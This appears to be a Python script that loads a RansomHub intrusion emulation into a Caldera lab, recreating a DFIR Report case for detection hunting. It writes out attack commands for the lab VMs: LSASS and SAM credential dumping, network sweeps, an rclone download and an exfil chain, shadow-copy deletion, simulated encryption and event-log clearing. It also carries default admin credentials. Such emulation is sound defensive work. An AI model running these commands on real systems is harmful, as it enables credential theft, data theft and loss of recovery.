#!/usr/bin/env python3
"""
caldera_ransomhub_setup.py
Hunt Lab recreation of The DFIR Report (2025-06):
"Hide Your RDP: Password Spray Leads to RansomHub Deployment".

POSTs ~12 abilities and one adversary "DFIR-RansomHub-2025-Lab" into
Caldera at http://192.168.56.10:8888 so it can be run against agent
group 'red' (the three Windows lab VMs).

Skipped vs the report (out of scope per agreed lab plan):
  - External RDP password spray (entry vector)
  - Atera/Splashtop RMM install
  - Real RansomHub binary detonation (we drop a benign rename-and-note
    simulator instead)
  - Real off-network exfil (we exfil to LocalStack S3 instead)

Pre-reqs before running an operation:
  bash docker/setup.sh                                                  # stack up
  vagrant up win-dc win-server win11-victim --no-parallel               # VMs up
  vagrant ssh-equivalent on win-server: powershell -File C:\\vagrant\\scripts\\scenarios\\ransomhub\\seed_decoy_data.ps1
  bash scripts/scenarios/ransomhub/seed_localstack_bucket.sh
  python3 scripts/caldera_ransomhub_setup.py                            # this script

Then in Caldera UI: Operations -> New Operation -> Adversary
  "DFIR-RansomHub-2025-Lab", Group "red", Start.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.request

# CALDERA_URL is overridden by the bootstrap container (uses Docker DNS).
# When run by hand from the host, the default points at the docker-host VM.
CALDERA = os.environ.get("CALDERA_URL", "http://192.168.56.10:8888").rstrip("/")
API_KEY = os.environ.get("CALDERA_API_KEY", "ADMIN123")
WAIT_SECONDS = int(os.environ.get("CALDERA_WAIT_SECONDS", "0"))

# Dwell durations (seconds) baked into the chain so the operation models
# attacker idle time between phases instead of running 12 abilities back-to-
# back. Defaults are lab-friendly (a few minutes total). To approximate the
# DFIR Report's actual hours-to-days dwell, set these to e.g.
#   RH_DWELL_FOOTHOLD=14400  (4h)  RH_DWELL_CREDS=28800 (8h)  RH_DWELL_IMPACT=86400 (24h)
# and re-run this script.
DWELL_FOOTHOLD = int(os.environ.get("RH_DWELL_FOOTHOLD", "30"))   # post initial recon
DWELL_CREDS    = int(os.environ.get("RH_DWELL_CREDS",    "60"))   # post credential theft
DWELL_IMPACT   = int(os.environ.get("RH_DWELL_IMPACT",  "120"))   # post exfil, pre encryption

ADVERSARY_ID = "rh-adversary-dfir-ransomhub-2025-lab"

# Path layout inside the Windows VMs.
# C:\vagrant is the Vagrant synced folder pointing at the repo root.
SCEN  = r"C:\vagrant\scripts\scenarios\ransomhub"
PUB   = r"C:\Users\Public"
ART   = r"C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"

# Powershell prefix for Atomic Red Team invocations.
ART_IMPORT = f"Import-Module '{ART}' -Force"


def api(method, path, body=None):
    url = CALDERA + path
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("KEY", API_KEY)
    if data:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read()), r.status
    except urllib.error.HTTPError as e:
        return {"error": e.read().decode()[:400]}, e.code
    except Exception as e:
        return {"error": str(e)}, 0


def upsert_ability(p):
    name, aid = p["name"], p["ability_id"]
    _, status = api("PUT", f"/api/v2/abilities/{aid}", p)
    if status in (200, 201):
        print(f"  OK  ability: {aid}  {name}")
        return True
    result, status = api("POST", "/api/v2/abilities", p)
    if status in (200, 201):
        print(f"  OK  ability: {aid}  {name}")
        return True
    print(f"  ERR ability: {aid}  HTTP {status}: {result}", file=sys.stderr)
    return False


def upsert_adversary(p):
    name, aid = p["name"], p["adversary_id"]
    _, status = api("PUT", f"/api/v2/adversaries/{aid}", p)
    if status in (200, 201):
        print(f"  OK  adversary: {aid}  {name}")
        return True
    result, status = api("POST", "/api/v2/adversaries", p)
    if status in (200, 201):
        print(f"  OK  adversary: {aid}  {name}")
        return True
    print(f"  ERR adversary: {aid}  HTTP {status}: {result}", file=sys.stderr)
    return False


def psh(command, timeout=180):
    return [{
        "name": "psh",
        "platform": "windows",
        "command": command,
        "timeout": timeout,
        "payloads": [],
        "uploads": [],
        "parsers": [],
        "cleanup": [],
        "variations": [],
    }]


def dwell_ability(ability_id, name, seconds, description):
    """A no-op sleep ability that models attacker dwell time between phases.
    Caldera schedules abilities back-to-back by default; without these the
    operation completes in ~3 minutes and looks nothing like a real intrusion.
    """
    return {
        "ability_id": ability_id,
        "name": name,
        "description": description,
        "tactic": "command-and-control",
        "technique_name": "Scheduled Transfer",
        "technique_id": "T1029",
        "executors": psh(
            # Print marker bookends so defenders see the dwell in the agent
            # logs, then sleep. Echo time on either side for cross-checking.
            f"Write-Output ('[dwell] start ' + (Get-Date -Format o) + ' sleep={seconds}s'); "
            f"Start-Sleep -Seconds {seconds}; "
            f"Write-Output ('[dwell] end ' + (Get-Date -Format o))",
            # Add 60s of head-room to the executor timeout so the watchdog
            # doesn't kill the sleep early.
            timeout=seconds + 60,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "dwell"],
        "buckets": ["dwell"],
    }


# ── Abilities ────────────────────────────────────────────────────────────────
abilities = [
    {
        "ability_id": "rh-01-recon-domain",
        "name": "RH: Domain & user enumeration",
        "description": (
            "Native Windows domain recon. Mirrors the actor's first-hour "
            "enumeration in The DFIR Report RansomHub case "
            "(net group, nltest, ipconfig, whoami /all)."
        ),
        "tactic": "discovery",
        "technique_name": "Domain Account Discovery",
        "technique_id": "T1087.002",
        "executors": psh(
            "whoami /all; "
            "net user /domain; "
            "net group 'Domain Admins' /domain; "
            "net group 'Enterprise Admins' /domain; "
            "nltest /domain_trusts; "
            "ipconfig /all",
            timeout=120,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "discovery"],
        "buckets": ["discovery"],
    },
    {
        "ability_id": "rh-02-recon-network",
        "name": "RH: Internal network sweep (Advanced IP Scanner-style)",
        "description": (
            "Pure-PowerShell substitute for Advanced IP Scanner / SoftPerfect "
            "NetScan. Sweeps 192.168.56.1-254 for ICMP + common TCP ports "
            "(135, 139, 445, 3389, 5985). Generates the same 'lots of TCP "
            "connect attempts in a short window' telemetry the originals do."
        ),
        "tactic": "discovery",
        "technique_name": "Network Service Discovery",
        "technique_id": "T1046",
        "executors": psh(
            "$ports=135,139,445,3389,5985; "
            "1..254 | ForEach-Object { "
            "  $ip = '192.168.56.' + $_; "
            "  if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) { "
            "    foreach ($p in $ports) { "
            "      $r = Test-NetConnection -ComputerName $ip -Port $p -WarningAction SilentlyContinue; "
            "      if ($r.TcpTestSucceeded) { Write-Output (\"OPEN $ip`:$p\") } "
            "    } "
            "  } "
            "}",
            timeout=600,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "discovery"],
        "buckets": ["discovery"],
    },
    dwell_ability(
        "rh-dwell-1-foothold",
        "RH: Dwell - post-foothold (operator analyses recon)",
        DWELL_FOOTHOLD,
        "Models the attacker pausing after initial recon to triage what they "
        "found before pivoting to credential theft. The DFIR Report shows "
        "this gap is typically 1-12 hours; lab default is short. "
        f"Tunable via RH_DWELL_FOOTHOLD env var (current: {DWELL_FOOTHOLD}s).",
    ),
    {
        "ability_id": "rh-03-creds-lsass",
        "name": "RH: LSASS dump via comsvcs.dll",
        "description": (
            "Atomic Red Team T1003.001 Test 1 - dumps LSASS using the signed "
            "comsvcs.dll MiniDump export. The DFIR Report saw the actor run "
            "mimikatz against LSASS; this is the same telemetry without "
            "shipping a tracked binary."
        ),
        "tactic": "credential-access",
        "technique_name": "LSASS Memory",
        "technique_id": "T1003.001",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs; "
            "Invoke-AtomicTest T1003.001 -TestNumbers 1",
            timeout=300,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "credential-access", "atomic"],
        "buckets": ["credential-access"],
    },
    {
        "ability_id": "rh-04-creds-sam",
        "name": "RH: SAM/SECURITY/SYSTEM hive copy",
        "description": (
            "Atomic Red Team T1003.002 Test 1 - reg save of SAM, SECURITY, "
            "and SYSTEM hives. Pairs with the LSASS dump to give defenders "
            "the classic 'two ways to lift creds' detection set."
        ),
        "tactic": "credential-access",
        "technique_name": "Security Account Manager",
        "technique_id": "T1003.002",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1003.002 -TestNumbers 1 -GetPrereqs; "
            "Invoke-AtomicTest T1003.002 -TestNumbers 1",
            timeout=180,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "credential-access", "atomic"],
        "buckets": ["credential-access"],
    },
    dwell_ability(
        "rh-dwell-2-creds",
        "RH: Dwell - post-credential-theft (offline cracking / sifting)",
        DWELL_CREDS,
        "Models the attacker taking dumped hashes and cred files off-host to "
        "crack / pick targets before logging back in. In the report this gap "
        "is often overnight or longer. Lab default is short. "
        f"Tunable via RH_DWELL_CREDS env var (current: {DWELL_CREDS}s).",
    ),
    {
        "ability_id": "rh-05-disc-fileshare",
        "name": "RH: Enumerate Finance file share",
        "description": (
            "Lists \\\\win-server\\Finance and recursively walks the share. "
            "This is the 'pick the loot' step that, in the report, immediately "
            "preceded the rclone exfil staging."
        ),
        "tactic": "discovery",
        "technique_name": "Network Share Discovery",
        "technique_id": "T1135",
        "executors": psh(
            "net view \\\\win-server; "
            "net use Z: \\\\win-server\\Finance /persistent:no; "
            "Get-ChildItem -Recurse -Path Z:\\ -ErrorAction SilentlyContinue | "
            "  Select-Object FullName,Length,LastWriteTime | "
            "  Out-File -FilePath C:\\Users\\Public\\share-loot.txt -Encoding ascii; "
            "Write-Output ('files=' + (Get-ChildItem -Recurse Z:\\ -File -ErrorAction SilentlyContinue).Count); "
            "net use Z: /delete /y",
            timeout=180,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "discovery"],
        "buckets": ["discovery"],
    },
    {
        "ability_id": "rh-06-evasion-symlink",
        "name": "RH: fsutil SymlinkEvaluation toggle",
        "description": (
            "The actor flipped fsutil behavior set SymlinkEvaluation R2L:1 "
            "R2R:1 to make their tooling chase remote-to-local and "
            "remote-to-remote symlinks. Distinctive command line, easy "
            "Sigma rule to write."
        ),
        "tactic": "defense-evasion",
        "technique_name": "File and Directory Permissions Modification",
        "technique_id": "T1222.001",
        "executors": psh(
            "fsutil behavior set SymlinkEvaluation R2L:1; "
            "fsutil behavior set SymlinkEvaluation R2R:1; "
            "fsutil behavior query SymlinkEvaluation",
            timeout=60,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "defense-evasion"],
        "buckets": ["defense-evasion"],
    },
    {
        "ability_id": "rh-07-tool-rclone-dl",
        "name": "RH: Download rclone at runtime",
        "description": (
            "Pulls rclone.exe down from downloads.rclone.org into "
            "C:\\Users\\Public during the operation. Faithful to the report "
            "(actor staged tooling at execution time, not pre-installed). "
            "Generates the canary 'unsigned admin tool dropped from web' "
            "telemetry the staging detection rules look for."
        ),
        "tactic": "command-and-control",
        "technique_name": "Ingress Tool Transfer",
        "technique_id": "T1105",
        "executors": psh(
            "$zip = 'C:\\Users\\Public\\rclone.zip'; "
            "$dst = 'C:\\Users\\Public\\rclone.exe'; "
            "if (Test-Path $dst) { Write-Output 'rclone already present'; exit 0 }; "
            "$url = 'https://downloads.rclone.org/rclone-current-windows-amd64.zip'; "
            "Write-Output (\"Downloading $url\"); "
            "& curl.exe -fsSL -o $zip $url; "
            "if ($LASTEXITCODE -ne 0) { Write-Error 'rclone download failed'; exit 1 }; "
            "$work = 'C:\\Users\\Public\\rclone-extract'; "
            "Remove-Item -Recurse -Force $work -ErrorAction SilentlyContinue; "
            "Expand-Archive -Path $zip -DestinationPath $work -Force; "
            "$rcl = Get-ChildItem -Recurse -Path $work -Filter 'rclone.exe' | Select-Object -First 1; "
            "if (-not $rcl) { Write-Error 'rclone.exe not found in archive'; exit 1 }; "
            "Copy-Item $rcl.FullName $dst -Force; "
            "Write-Output (\"rclone staged at $dst (\" + (Get-Item $dst).Length + ' bytes)')",
            timeout=300,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "command-and-control"],
        "buckets": ["command-and-control"],
    },
    {
        "ability_id": "rh-08-tool-stage-artifacts",
        "name": "RH: Stage rclone wrappers (nocmd.vbs, rcl.bat, include.txt)",
        "description": (
            "Drops the report's exact filenames into C:\\Users\\Public so "
            "the next step matches Sigma rules keyed on those names. "
            "Source files live on the Vagrant share at "
            "C:\\vagrant\\scripts\\scenarios\\ransomhub\\."
        ),
        "tactic": "command-and-control",
        "technique_name": "Ingress Tool Transfer",
        "technique_id": "T1105",
        "executors": psh(
            f"$src = '{SCEN}'; $dst = '{PUB}'; "
            "Copy-Item -Path (Join-Path $src 'nocmd.vbs')       -Destination $dst -Force; "
            "Copy-Item -Path (Join-Path $src 'rcl.bat')         -Destination $dst -Force; "
            "Copy-Item -Path (Join-Path $src 'include.txt')     -Destination $dst -Force; "
            "Copy-Item -Path (Join-Path $src 'ransom_note.txt') -Destination $dst -Force; "
            "Get-ChildItem $dst | Where-Object { $_.Name -in 'nocmd.vbs','rcl.bat','include.txt','ransom_note.txt' } | "
            "  Select-Object Name,Length,LastWriteTime",
            timeout=60,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "command-and-control"],
        "buckets": ["command-and-control"],
    },
    {
        "ability_id": "rh-09-exfil-rclone",
        "name": "RH: Exfil Finance share to LocalStack S3 via rclone",
        "description": (
            "Runs nocmd.vbs, which spawns cmd /c rcl.bat hidden, which "
            "invokes rclone copy of \\\\win-server\\Finance to "
            "s3://ransomhub-exfil-lab/finance/ on LocalStack. Same wrapper "
            "and process tree as the report; only the destination is swapped "
            "to a local sandbox bucket."
        ),
        "tactic": "exfiltration",
        "technique_name": "Exfiltration to Cloud Storage",
        "technique_id": "T1567.002",
        "executors": psh(
            "wscript.exe C:\\Users\\Public\\nocmd.vbs; "
            "Start-Sleep -Seconds 30; "
            "if (Test-Path C:\\Users\\Public\\rcl.log) { "
            "  Get-Content C:\\Users\\Public\\rcl.log -Tail 40 "
            "} else { Write-Output 'no rcl.log yet - check rclone process' }",
            timeout=300,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "exfiltration"],
        "buckets": ["exfiltration"],
    },
    dwell_ability(
        "rh-dwell-3-pre-impact",
        "RH: Dwell - post-exfil, pre-impact (wait for low-traffic window)",
        DWELL_IMPACT,
        "Models the attacker holding off on the destructive stage until exfil "
        "has fully completed and they pick a low-traffic window (often a "
        "weekend or night). This is the longest dwell in real cases — "
        "frequently 24-72 hours. Lab default is short. "
        f"Tunable via RH_DWELL_IMPACT env var (current: {DWELL_IMPACT}s).",
    ),
    {
        "ability_id": "rh-10-impact-vss",
        "name": "RH: Delete shadow copies (vssadmin)",
        "description": (
            "Atomic Red Team T1490 Test 1 - vssadmin Delete Shadows /all /quiet. "
            "Standard ransomware pre-encryption cleanup; trivial to detect, "
            "ships in every prebuilt detection ruleset."
        ),
        "tactic": "impact",
        "technique_name": "Inhibit System Recovery",
        "technique_id": "T1490",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1490 -TestNumbers 1",
            timeout=120,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "impact", "atomic"],
        "buckets": ["impact"],
    },
    {
        "ability_id": "rh-11-impact-encrypt",
        "name": "RH: Simulated RansomHub encryptor (rename + drop note)",
        "description": (
            "Stand-in for amd64.exe. Walks C:\\Shares\\Finance, renames every "
            "file to <name>.locked, drops README_RANSOMHUB.txt in each "
            "directory. No real encryption. Generates the mass-rename + "
            "ransom-note-drop telemetry that ransomware behavior rules key on."
        ),
        "tactic": "impact",
        "technique_name": "Data Encrypted for Impact",
        "technique_id": "T1486",
        "executors": psh(
            "powershell -ExecutionPolicy Bypass -File "
            f"{SCEN}\\fake_amd64.ps1 "
            f"-NoteSrc {PUB}\\ransom_note.txt "
            f"-Marker {PUB}\\amd64-ran.flag",
            timeout=300,
        ),
        "requirements": [],
        "privilege": "",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "impact"],
        "buckets": ["impact"],
    },
    {
        "ability_id": "rh-12-evasion-clearlogs",
        "name": "RH: Clear Windows event logs (wevtutil)",
        "description": (
            "Atomic Red Team T1070.001 Test 1 - wevtutil cl on Application, "
            "System, Security. The actor's parting gift to defenders."
        ),
        "tactic": "defense-evasion",
        "technique_name": "Clear Windows Event Logs",
        "technique_id": "T1070.001",
        "executors": psh(
            f"{ART_IMPORT}; Invoke-AtomicTest T1070.001 -TestNumbers 1",
            timeout=120,
        ),
        "requirements": [],
        "privilege": "Elevated",
        "repeatable": True,
        "singleton": False,
        "additional_info": {},
        "tags": ["hunt-lab", "ransomhub", "defense-evasion", "atomic"],
        "buckets": ["defense-evasion"],
    },
]


adversary = {
    "adversary_id": ADVERSARY_ID,
    "name": "DFIR-RansomHub-2025-Lab",
    "description": (
        "Hunt Lab recreation of The DFIR Report's June 2025 RansomHub case "
        "(\"Hide Your RDP: Password Spray Leads to RansomHub Deployment\"). "
        "Skips entry vector (RDP password spray) and RMM install. "
        "Exfil destination is LocalStack S3 (s3://ransomhub-exfil-lab) "
        "instead of the SFTP endpoint in the report. "
        "Encryption stage is a benign rename + ransom-note drop. "
        "Run against agent group 'red'."
    ),
    "atomic_ordering": [a["ability_id"] for a in abilities],
    "tags": ["hunt-lab", "ransomhub", "dfir-report", "2025-06"],
}


def wait_for_caldera(max_seconds):
    """Poll Caldera /api/v2/health until it answers OK or we time out."""
    if max_seconds <= 0:
        return True
    deadline = time.time() + max_seconds
    print(f"=== Waiting up to {max_seconds}s for Caldera at {CALDERA} ===")
    while time.time() < deadline:
        try:
            req = urllib.request.Request(CALDERA + "/api/v2/health")
            req.add_header("KEY", API_KEY)
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status == 200:
                    print(f"  Caldera ready.")
                    return True
        except Exception:
            pass
        time.sleep(5)
    print(f"  WARNING: Caldera not ready after {max_seconds}s — attempting anyway", file=sys.stderr)
    return False


if __name__ == "__main__":
    wait_for_caldera(WAIT_SECONDS)
    print(f"=== RansomHub recreation: pushing abilities to Caldera at {CALDERA} ===")
    ok = True
    for a in abilities:
        ok &= upsert_ability(a)
    print()
    print("=== Pushing adversary ===")
    ok &= upsert_adversary(adversary)
    print()
    if ok:
        print("Done.")
        print()
        print("Pre-flight before launching the operation:")
        print("  1. On win-server: powershell -File C:\\vagrant\\scripts\\scenarios\\ransomhub\\seed_decoy_data.ps1")
        print("  2. From host:    bash scripts/scenarios/ransomhub/seed_localstack_bucket.sh")
        print("  3. Caldera UI:   Operations -> New Operation")
        print("                   Adversary: DFIR-RansomHub-2025-Lab")
        print("                   Group:     red")
        print()
        print(f"  Caldera: {CALDERA}  (admin / admin)")
    else:
        print("Some objects failed - see errors above.", file=sys.stderr)
        sys.exit(1)
